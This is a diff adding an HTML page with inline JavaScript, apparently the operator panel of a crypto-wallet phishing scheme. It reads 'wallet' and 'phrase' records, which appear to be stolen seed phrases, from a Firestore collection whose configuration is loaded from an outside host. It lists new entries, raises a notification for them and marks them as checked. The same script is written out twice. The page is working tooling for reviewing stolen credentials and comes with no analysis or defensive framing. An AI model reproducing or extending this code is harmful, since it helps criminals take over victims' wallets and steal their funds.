@@ -1,0 +1,263 @@
+<!doctype html><html><head></head><body><html lang="en">
+<script type="text/javascript">
+	window["_gaUserPrefs"] = { ioo : function() { return true; } }
+</script>
+<link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
+<link type="text/css" rel="stylesheet" id="dark-mode-general-link">
+<style lang="en" type="text/css" id="dark-mode-custom-style"></style>
+<style lang="en" type="text/css" id="dark-mode-native-style"></style>
+<style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
+<script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script>
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="refresh" content="30">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
+	<script src="https://code.jquery.com/jquery-3.6.1.min.js"
+		integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+	<style>
+		body {
+			margin-top: 50px;
+
+		}
+
+
+		.box {
+			width: 500px;
+			margin-left: auto;
+			margin-right: auto;
+		}
+
+		hr {
+			width: 900px;
+			margin-left: auto;
+			margin-right: auto;
+		}
+
+		#for-logout {
+			margin-left: 90%;
+			margin-bottom: 50px;
+		}
+	</style>
+</head>
+
+<body>
+
+	<div class="container">
+		<div id="for-logout">
+			<button id="logout" class="button is-danger">logout</button><br><br>
+			<button onclick="location.href='./old/panel.html'" class="button is-warning">oldpanel</button><br><br>
+			<button onclick="location.href='./beta'" class="button is-dark">Beta Panel</button><br><br>
+			<button onclick="location.href='./source'" class="button is-dark is-small">source</button>
+		</div>
+
+		<div class="box new-entry">
+			<span class="tag is-primary is-medium">NEW ENTRY</span><br><br>
+
+        </div>
+			<hr>
+			<hr>
+			<div class="box checked-entry">
+				<span class="tag is-info is-medium">CHECKED</span><br><br>
+        </div>
+			</div>
+			<script defer="" src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js">
+			</script>
+			<script defer="" src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js">
+			</script>
+			<script defer="" src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+			<script type="module" src="main.js"></script>
+
+
+</body>
+
+</html>
+      <script type="module">// import {notify} from 'https://giterhaber.github.io/web-codes/notification.js'
+// import { cmBwsbFSqC as config } from 'https://giterhaber.github.io/web-codes/configs.js';
+// import firebase from "https://cdn.skypack.dev/firebase/compat/app";
+// import "https://cdn.skypack.dev/firebase/compat/auth";
+// import "https://cdn.skypack.dev/firebase/compat/firestore";
+import { IOASJD92 as config } from 'https://giterhaber.github.io/web-codes/IOASJD92.js';
+firebase.initializeApp(config);
+var db = firebase.firestore(); //   const auth = firebase.auth();
+
+function format(mainID, first, second, third) {
+  var textFormat = "\n        <div class=\"data-content\" id=\"".concat(mainID, "\">\n        <span class=\"tag is-primary is-light\">").concat(first, "<button class=\"delete is-small\"></button></span>\n        <br>\n        <span class=\"tag is-success\">").concat(second, "</span>\n        <span class=\"tag\">").concat(third, "</span>\n        </div><br>  \n\n    ");
+  return textFormat;
+} //date format
+
+
+var options = {
+  hour: 'numeric',
+  minute: 'numeric',
+  hour12: true
+}; //date format end code
+
+db.collection('data').orderBy('time', 'desc').where('status', '==', 'active').get().then(function (querySnapshot) {
+  querySnapshot.forEach(function (doc) {
+    var docData, walletData, phraseData, timeData;
+    docData = doc.id;
+    walletData = doc.data().wallet;
+    phraseData = doc.data().phrase;
+    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options);
+    $('.new-entry').append(format(docData, phraseData, walletData, timeData));
+  });
+  $('.new-entry').find('.data-content').each(function () {
+    var _this = this;
+
+    //click
+    $(this).find('button').on('click', function () {
+      var contentID = $(_this).attr('id');
+      console.log(contentID);
+      return db.collection('data').doc(contentID).update({
+        status: 'inactive'
+      }).then(function () {
+        location.reload();
+      })["catch"](function () {
+        console.log('err');
+      });
+    }); //click end
+
+    console.log('ready');
+  });
+  var entryCount = $('.new-entry').find('.data-content').length;
+
+  if (entryCount === 0) {
+    console.log('0');
+  } else {
+    notify(entryCount + ' new entry!', 'click to open', 'https://i.pinimg.com/236x/9f/ee/55/9fee55fe5559da752bd2851103b9f69b.jpg');
+  }
+});
+db.collection('data').orderBy('time', 'desc').where('status', '==', 'inactive').get().then(function (querySnapshot) {
+  querySnapshot.forEach(function (doc) {
+    var docData, walletData, phraseData, timeData;
+    docData = doc.id;
+    walletData = doc.data().wallet;
+    phraseData = doc.data().phrase;
+    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options);
+    $('.checked-entry').append(format(docData, phraseData, walletData, timeData));
+  }); //   $('.checked-entry').find('.data-content').each(function() {
+  //     $(this).find('button').on('click', () => {
+  //       let contentID = $(this).attr('id')
+  //       let confirmAction = confirm('Confirm Delete?')
+  //       if (confirmAction == true) {
+  //         console.log('press ok')
+  //         db.collection('data').doc(contentID).delete()
+  //         .then(() => {location.reload()}).catch(() => {console.log('error')})
+  //       } else {
+  //         console.log('error')
+  //       }
+  // });
+  //});
+}); //LOGOUT
+
+document.querySelector('#logout').addEventListener('click', signoutpage);
+
+function signoutpage() {
+  firebase.auth().signOut();
+} //  firebase.auth().onAuthStateChanged((user) => {
+//     if (user) {
+//       // User is signed in, see docs for a list of available properties
+//       // https://firebase.google.com/docs/reference/js/firebase.User
+//       var uid = user.uid;
+//       // ...
+//     } else {
+//       location.href = "/";
+//     }
+//   });</script>
+      <script nomodule>// import {notify} from 'https://giterhaber.github.io/web-codes/notification.js'
+// import { cmBwsbFSqC as config } from 'https://giterhaber.github.io/web-codes/configs.js';
+// import firebase from "https://cdn.skypack.dev/firebase/compat/app";
+// import "https://cdn.skypack.dev/firebase/compat/auth";
+// import "https://cdn.skypack.dev/firebase/compat/firestore";
+import { IOASJD92 as config } from 'https://giterhaber.github.io/web-codes/IOASJD92.js';
+firebase.initializeApp(config);
+var db = firebase.firestore(); //   const auth = firebase.auth();
+
+function format(mainID, first, second, third) {
+  var textFormat = "\n        <div class=\"data-content\" id=\"".concat(mainID, "\">\n        <span class=\"tag is-primary is-light\">").concat(first, "<button class=\"delete is-small\"></button></span>\n        <br>\n        <span class=\"tag is-success\">").concat(second, "</span>\n        <span class=\"tag\">").concat(third, "</span>\n        </div><br>  \n\n    ");
+  return textFormat;
+} //date format
+
+
+var options = {
+  hour: 'numeric',
+  minute: 'numeric',
+  hour12: true
+}; //date format end code
+
+db.collection('data').orderBy('time', 'desc').where('status', '==', 'active').get().then(function (querySnapshot) {
+  querySnapshot.forEach(function (doc) {
+    var docData, walletData, phraseData, timeData;
+    docData = doc.id;
+    walletData = doc.data().wallet;
+    phraseData = doc.data().phrase;
+    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options);
+    $('.new-entry').append(format(docData, phraseData, walletData, timeData));
+  });
+  $('.new-entry').find('.data-content').each(function () {
+    var _this = this;
+
+    //click
+    $(this).find('button').on('click', function () {
+      var contentID = $(_this).attr('id');
+      console.log(contentID);
+      return db.collection('data').doc(contentID).update({
+        status: 'inactive'
+      }).then(function () {
+        location.reload();
+      })["catch"](function () {
+        console.log('err');
+      });
+    }); //click end
+
+    console.log('ready');
+  });
+  var entryCount = $('.new-entry').find('.data-content').length;
+
+  if (entryCount === 0) {
+    console.log('0');
+  } else {
+    notify(entryCount + ' new entry!', 'click to open', 'https://i.pinimg.com/236x/9f/ee/55/9fee55fe5559da752bd2851103b9f69b.jpg');
+  }
+});
+db.collection('data').orderBy('time', 'desc').where('status', '==', 'inactive').get().then(function (querySnapshot) {
+  querySnapshot.forEach(function (doc) {
+    var docData, walletData, phraseData, timeData;
+    docData = doc.id;
+    walletData = doc.data().wallet;
+    phraseData = doc.data().phrase;
+    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options);
+    $('.checked-entry').append(format(docData, phraseData, walletData, timeData));
+  }); //   $('.checked-entry').find('.data-content').each(function() {
+  //     $(this).find('button').on('click', () => {
+  //       let contentID = $(this).attr('id')
+  //       let confirmAction = confirm('Confirm Delete?')
+  //       if (confirmAction == true) {
+  //         console.log('press ok')
+  //         db.collection('data').doc(contentID).delete()
+  //         .then(() => {location.reload()}).catch(() => {console.log('error')})
+  //       } else {
+  //         console.log('error')
+  //       }
+  // });
+  //});
+}); //LOGOUT
+
+document.querySelector('#logout').addEventListener('click', signoutpage);
+
+function signoutpage() {
+  firebase.auth().signOut();
+} //  firebase.auth().onAuthStateChanged((user) => {
+//     if (user) {
+//       // User is signed in, see docs for a list of available properties
+//       // https://firebase.google.com/docs/reference/js/firebase.User
+//       var uid = user.uid;
+//       // ...
+//     } else {
+//       location.href = "/";
+//     }
+//   });</script></body><html>
